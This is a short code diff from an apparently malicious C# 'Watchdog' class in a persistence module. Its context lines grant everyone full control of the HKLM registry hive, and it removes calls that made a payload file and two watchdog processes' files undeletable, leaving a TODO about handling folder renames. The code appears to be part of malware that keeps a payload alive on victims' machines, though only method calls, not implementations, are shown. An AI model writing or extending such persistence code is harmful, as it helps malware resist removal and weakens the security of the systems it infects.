@@ -64,10 +64,9 @@ class Watchdog
             Persistence.Persistence.GrantEveryoneFullControl("HKLM");
             Persistence.Persistence.GrantEveryoneFullControl("HKLU");
 
-            // mess with the access control
-            Persistence.Persistence.MakeFileUndeletable(Config.PayloadFullPath);
-            Persistence.Persistence.MakeFileUndeletable(Config.SecondaryWatchdogFullPath);
-            Persistence.Persistence.MakeFileUndeletable(Config.PrimaryWatchdogFullPath);
+            // mess with the access control on files and folders
+            //implement way to deal with folder name changing
+           
 
 
 
